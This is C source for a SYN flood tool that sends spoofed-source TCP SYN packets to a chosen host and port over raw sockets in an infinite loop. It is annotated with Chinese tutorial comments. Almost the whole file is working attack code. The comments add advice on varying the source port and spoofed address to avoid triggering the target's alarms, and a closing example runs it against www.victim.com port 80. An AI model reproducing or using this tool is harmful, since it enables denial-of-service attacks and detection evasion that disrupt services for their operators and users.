/* Syn Attack against a port for Solaris */
/* Original land attack, land.c by m3lt, FLC */
/* Ported to 44BSD by blast and jerm */
/* Ported to Solaris by ziro antagonist */
/* Referenced flood.c by unknown author */
/* Converted into a syn attack against one port by CRG */
/* Please use this for educational purposes only */
/* Compiles on Solaris gcc -o synsol synsol.c -lsocket -lnsl */
/* Additional notes: */
/* Successfully compiled on Solaris 2.51 and 2.6 */
/* Runs: synsol <dstIP> <dstPort> <spoofedsrcIP> */
/* Tested it on: Solaris 2.6 */
/* Attacked against: */
/* Most of these test machines are not patched because they */
/* are in test lab. I tested the program against port 23 and */
/* every once in awhile I did get through. */
/* Direct any comments, questions, improvements to */
/* packetstorm@genocide2600.com */
/* http://www.genocide2600.com/~tattooman/ */
/* Your emails will be forwarded to the author, who wishes */
/* to remain known only as CRG (no email addy or URL) */
/*jjgirl:上面的注释的不用说了！*/
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
/*jjgirl:上面是头文件！*/

unsigned long srcport;

struct pseudohdr
{
struct in_addr saddr;
/*clapnet:源地址*/
struct in_addr daddr;
/*clapnet:目的地址*/
u_char zero;
u_char protocol;
/*clapnet:协议类型*/
u_short length;
/*clapnet:TCP长度*/
struct tcphdr tcpheader;
};
/*jjgirl:定义一个伪装地址的结构！*/

u_short checksum(u_short * data,u_short length)
{
int nleft = length;
int sum=0;
unsigned short *w = data;
unsigned short value = 0;

while (nleft > 1) {
sum += *w++;
nleft -= 2;
}

if (nleft == 1) {
*(unsigned char *) (&value) = *(unsigned char *) w;
sum += value;
}
sum = (sum >>16) + (sum & 0xffff);
sum += (sum >> 16);
value = ~sum;
return(value);
}
/*jjgirl:上面校验文件！包头是需要校验的，CRC校验！*/
/*clapnet:因为我们使用RAW Socket发送数据报，所以我们只能自己来做校验*/

int main(int argc,char * * argv)
{/*jjgirl:主程序开始了！*/
struct sockaddr_in sin;
struct sockaddr_in din;
struct hostent * hoste;
struct hostent * host1;
int j,sock,foo, flooddot=1;
char buffer[40];
struct ip * ipheader=(struct ip *) buffer;
struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct ip));
struct pseudohdr pseudoheader;
/*jjgirl:上面定义变量！*/

fprintf(stderr,"Syn attack against one port.(Infinite)/n");

if(argc<4)
{
fprintf(stderr,"usage: %s <dstIP> <dstport> <spoofed-srcIP>/n",argv[0]);
return(-1);
}
/*jjgirl:上面是判断参数！*/
/*clapnet:如果输入的格式错误，就显示详细使用方法我们可以看到他的使用方法是：#<编译后的程式名> <目标地址> <目标端口> <我们伪装的地址> */
fprintf(stderr,"%s:%s is being syn'd attacked by %s./n",argv[1],argv[2],argv[3]);
bzero(&sin,sizeof(struct sockaddr_in)); /*write sizeof to &sin*/
sin.sin_family=AF_INET;

if((host1=gethostbyname(argv[3]))!=NULL)
/*clapnet:检查输入的伪装地址是否符合格式要求，这里是以域名方式输入，并得到相对应的IP*/
bcopy(host1->h_addr,&din.sin_addr,host1->h_length);
else if((din.sin_addr.s_addr=inet_addr(argv[3]))==-1)
{/*clapnet:检查输入的伪装地址是否符合格式要求，这里是以IP方式输入*/
fprintf(stderr,"unknown source host %s/n",argv[3]);
return(-1);
}


if((hoste=gethostbyname(argv[1]))!=NULL)
/*clapnet:检查输入的目标地址是否符合格式要求，这里是以域名方式输入，并得到相对应的IP*/
bcopy(hoste->h_addr,&sin.sin_addr,hoste->h_length);
else if((sin.sin_addr.s_addr=inet_addr(argv[1]))==-1)
{/*clapnet:检查输入的目标地址是否符合格式要求，这里是以IP方式输入*/
fprintf(stderr,"unknown destination host %s/n",argv[1]);
return(-1);
}

if((sin.sin_port=htons(atoi(argv[2])))==0)
/*clapnet:检查输入的目标端口是否符合要求*/
{
fprintf(stderr,"unknown port %s/n",argv[2]);
return(-1);
}

/*jjgirl:上面是给sockaddr_in结构赋值，需要指明协议，端口号！*/

if((sock=socket(AF_INET,SOCK_RAW,255))==-1)
{/*clapnet:大家看清了，在以RAW socket方式构造套接字描述符*/
fprintf(stderr,"couldn't allocate raw socket/n");
return(-1);
}
/*jjgirl:上面开始Socket了！*/

foo=1;
if(setsockopt(sock,0,IP_HDRINCL,(char *)&foo,sizeof(int))==-1)
{
fprintf(stderr,"couldn't set raw header on socket/n");
return(-1);
}
/*jjgirl:上面是为了重构报头！*/

for(j=1;j>0;j++)
{
/*clapnet:进入循环，开始攻击了。
这里的j用在下面显示发包次数，但我个人并不赞同这么做。显示攻击次数会降低整个程序执行效率。我们要的就是洪水，我不关心洪水的流量！
所以，如果你同意我的观点，把for 改成 while(1)就可以了*/

bzero(&buffer,sizeof(struct ip)+sizeof(struct tcphdr));
ipheader->ip_v=4;
/*clapnet:题外话：目前使用的IP版本都是4*/
ipheader->ip_tos=0;
ipheader->ip_hl=sizeof(struct ip)/4;
ipheader->ip_len=sizeof(struct ip)+sizeof(struct tcphdr);
ipheader->ip_id=htons(random());
ipheader->ip_ttl=30; /*255;*/
/*clapnet:IP包的生命周期ttl=time to life*/
ipheader->ip_p=IPPROTO_TCP;
ipheader->ip_sum=0;
ipheader->ip_src=din.sin_addr;
ipheader->ip_dst=sin.sin_addr;

tcpheader->source=htons(srcport); /*sin.sin_port;*/
tcpheader->dest=sin.sin_port;
tcpheader->seq=htonl(0x28374839);
tcpheader->syn=1;
tcpheader->doff=sizeof(struct tcphdr)/4;
tcpheader->window=htons(2048);
tcpheader->check=0;

/*clapnet:嘿嘿，按照上面的进行编译，在Linux上是不会通过地！我在这里耽搁了30分钟。
大家有兴趣可以看看tcp.h，上面的定义是给Free BSD地，如果是用Linux的兄弟，要这样改
tcpheader->source=htons(srcport);
源端口号
tcpheader->dest=in.sin_port;
目的端口号
tcpheader->seq=htonl(0x28374839);
SYN序列号
tcpheader->ack=0;
ACK序列号置为0
tcpheader->syn=1;
SYN 标志
tcpheader->doff=sizeof(struct tcphdr)/4;
tcpheader->window=htons(2048);
窗口大小
tcpheader->check=0;
*/


bzero(&pseudoheader,12+sizeof(struct tcphdr));
pseudoheader.saddr.s_addr=din.sin_addr.s_addr;
/*clapnet:源地址*/
pseudoheader.daddr.s_addr=sin.sin_addr.s_addr;
/*clapnet:目的地址*/
pseudoheader.protocol=6;
/*clapnet:协议类型*/
pseudoheader.length=htons(sizeof(struct tcphdr));
/*clapnet:TCP首部长度*/
bcopy((char *) tcpheader,(char *) &pseudoheader.tcpheader,sizeof(struct tcphdr));
tcpheader->check=checksum((u_short *) &pseudoheader,12+sizeof(struct tcphdr));
/*jjgirl:上面是重构报头！*/

srcport= (10000.0*random()/(15000+1.0));
/*jjgirl:端口当然要变！*/
/*clapnet:佳佳为什么强调端口一定要变呢？
Easy！当对方收到来自同一个地址，同一个端口的数据包到达一定数量时，很容易触发对方的报警机制，从而作出一定的反映...
当然，如果要做到尽善尽美，连虚拟的IP地址也要不断地变。这样才能使对方措手不及！
*/

if(sendto(sock,buffer,sizeof(struct ip)+sizeof(struct tcphdr),0,(struct sockaddr *) &sin,sizeof(struct sockaddr_in))==-1)
/*jjgirl:攻击开始！*/
/*clapnet:使用sendto函数发送我们制定的包*/
{
fprintf(stderr,"couldn't send packet,%d/n",errno);
return(-1);
}
usleep(2);
if (!(flooddot = (flooddot+1)%(1)))
{fprintf(stdout,".");fflush(stdout);}

/*jjgirl:显示次数！ Jjgirl 把上面一句,改为如下两句,增加显示效果,随你的便！
{fprintf(stdout,".%4d",j);fflush(stdout);}
int k=j; if((k%10)==0) printf("/n"); */

} /*The end of the infinite loop*/
/*clapnet:注意，上面的循环可是死循环哦，到什么时候跳出，你自己根据喜好加代码*/
close(sock);
return(0);
}
/*jjgirl:结束！编译试试吧！如果有看不懂可以给我留言,或来信jjgirl@263.net,或复习前面的课程！*/
/*jjgirl:若有人引用本文,请事先通知,并请保持完整性！*/

/*clapnet:编译试试：
#gcc -o syn_flood syn_flood.c
注意到#了吗？不是root就免谈咯：）
Go go go！ Fire in the hole...！enemy down....
#./syn_flood www.victim.com 80 xxx.xxx.xxx.xxx
*/ 